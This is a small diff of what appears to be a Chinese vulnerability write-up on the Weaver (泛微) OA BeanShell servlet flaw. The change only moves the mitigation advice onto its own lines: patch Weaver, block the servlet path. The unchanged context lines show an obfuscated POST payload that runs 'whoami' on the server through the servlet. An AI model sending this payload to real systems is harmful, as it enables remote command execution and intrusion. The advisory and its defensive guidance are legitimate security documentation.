@@ -28,7 +28,9 @@ Content-Length: 98
 Content-Type: application/x-www-form-urlencoded
 
 bsh.script=eval%00("ex"%2b"ec(\"whoami\")");&bsh.servlet.captureOutErr=true&bsh.servlet.output=raw 
-```防护方法 1.及时更新泛微补丁 2.拦截/weaver/bsh.servlet.BshServlet目录的访问
+```
+
+防护方法 1.及时更新泛微补丁 2.拦截/weaver/bsh.servlet.BshServlet目录的访问
 
 
 ---
